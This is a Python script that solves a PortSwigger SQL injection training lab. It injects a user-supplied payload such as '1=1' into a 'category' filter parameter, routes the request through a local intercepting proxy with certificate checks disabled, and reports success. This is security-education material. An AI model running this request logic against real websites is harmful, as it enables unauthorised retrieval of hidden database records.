#https://portswigger.net/web-security/sql-injection
#https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
#Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = 'filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        #url = sys.argv[1].strip()
        #payload = sys.argv[2].strip()
	print("\n==================================================================================")
	print('Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data')
	print("==================================================================================\n")
	url = input('--> Enter the Url inside the double quotes\n'+ '[1] Eg:"url" : ').strip()
        payload = input('\n--> Enter the vulnerability to inject\n' + '[2] Eg:"vulnerable code": ').strip()
    except NameError:
        #print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        #print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
	print("[-] Usage: <url> <payload>")
        print('[-] Example: www.example.com "1=1"') 
    except SyntaxError:
	print("Provide the input within double quotes")	
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("\n[+] SQL Injection successful!")
    else:
        print("\n[-] SQL Injection unsuccessful!")
